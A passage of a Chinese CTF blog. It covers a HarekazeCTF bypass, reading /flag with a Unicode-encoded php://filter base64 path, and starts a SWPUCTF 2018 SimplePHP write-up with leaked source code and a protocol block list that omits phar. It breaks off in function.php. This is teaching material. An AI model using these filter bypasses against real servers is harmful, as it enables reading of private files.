  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// no data exfiltration!!!</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//PHP 输入流中获取请求的主体内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>if判断有三个条件：<br>1、检测传入的内容是否合法也就是<code>is_valid()</code>，传入的内容里面不能含有非法字符，但是没有过滤filter协议<br>2、传入的格式就是json格式<br>3、传入的参数就是page<br>三个条件同时满足的话就会通过<code>file_get_contents</code>得到该文件</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//这里不绕过的话flag会被覆盖掉，因此使用filter伪协议来绕过（将内容进行base64加密后flag就不会被覆盖了）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>因为要读取flag文件，但是<code>is_valid()</code>函数将flag和php都过滤了，所以这里还有一个知识点就是:</p>
<blockquote>
<p>php的json_decode在遇到unicode编码时会自动把它转换成正常的字符</p>
</blockquote>
<p>那么将<code>php://filter/read=convert.base64-encode/resource=/flag</code>进行<a href="https://tool.chinaz.com/tools/unicode.aspx">Unicode编码</a><br><img src="https://img-blog.csdnimg.cn/direct/b5998a581da445da9c4c4a1a7cecc9f3.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/direct/2b057cfdc190400485cb62914ac1568c.png" alt="789"><br>然后将flag进行解码。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-WEB之[SWPUCTF 2018]SimplePHP</title>
    <url>/2023/12/13/BUUCTF-WEB%E4%B9%8B-SWPUCTF-2018-SimplePHP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>考点：phar反序列化、代码审计<br>当点击查看文件的时候发现可疑点<code>http://120c99fe-157d-4ecc-8b63-b4198d09299f.node4.buuoj.cn:81/file.php?file=</code>读取index.php文件的时候发现可以读取到源码，将源码全部读取过来。<br><img src="https://img-blog.csdnimg.cn/direct/e977ff1fc72743459855cc5407f146a4.png" alt="456"></p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token string single-quoted-string">'base.php'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>定位到base.php</p>
<h3 id="base-php"><a href="#base-php" class="headerlink" title="base.php"></a>base.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span> 
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>web3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file.php?file=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>查看文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> 
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span> 
<span class="token comment">&lt;!--flag is in f1ag.php--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里输出了一个REMOTE_ADDR，也就是我的ip地址。也就是首页的IP。也告诉了flag文件名称，估计是让进行文件读取操作</p>
<blockquote>
<p>这里需要知道：<strong>REMOTE_ADDR 协议头是不可伪造的</strong></p>
</blockquote>
<p>所以漏洞点不在这里</p>
<h3 id="file-php"><a href="#file-php" class="headerlink" title="file.php"></a>file.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用<code>file_exists()</code>函数来检测<code>file</code>传入的文件是否存在，如果存在，将文件赋值给Show类的$source，并且调用_show()方法，Show类在class文件中。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件名——》file_exists()——》正则过滤》读取。显然这里没有过滤phar协议。</p>
<h3 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload_file.php"></a>upload_file.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> 
<span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charest</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>文件上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">align</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>前端写得很low,请各位师傅见谅!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"> 
    <span class="token selector">p</span><span class="token punctuation">&#123;</span> <span class="token property">margin</span><span class="token punctuation">:</span>0 auto<span class="token punctuation">&#125;</span> 
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用来上传文件，并且与function,php配合来检查文件合法性：上传的文件经过<code>function.php</code>文件中的<code>upload_file()</code>在检查完文件名合法后给上传的文件重命名</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>放在upload文件夹下</p>
<h3 id="function-php"><a href="#function-php" class="headerlink" title="function.php"></a>function.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//show_source(__FILE__); </span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"base.php"</span><span class="token punctuation">;</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span> 
    <span class="token comment">//mkdir("upload",0777); </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("上传成功!");&lt;/script>'</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
